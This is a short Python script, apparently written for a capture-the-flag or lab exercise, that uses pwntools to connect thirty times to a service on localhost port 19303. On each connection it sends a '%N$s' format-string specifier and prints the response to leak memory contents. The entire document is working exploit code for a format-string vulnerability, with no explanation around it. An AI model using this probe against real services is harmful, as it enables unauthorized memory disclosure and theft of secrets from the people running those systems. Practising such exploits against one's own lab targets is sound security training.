#! /bin/python3

from pwn import *

host,port = '127.0.0.1', 19303

for i in range(30):
    s = remote(host,port)
    s.recvuntil(b'>>')
    s.sendline('%' + str(i) + '$s')
    print(s.recvuntil(b'-'))
    print(i, s.recv())
    s.close()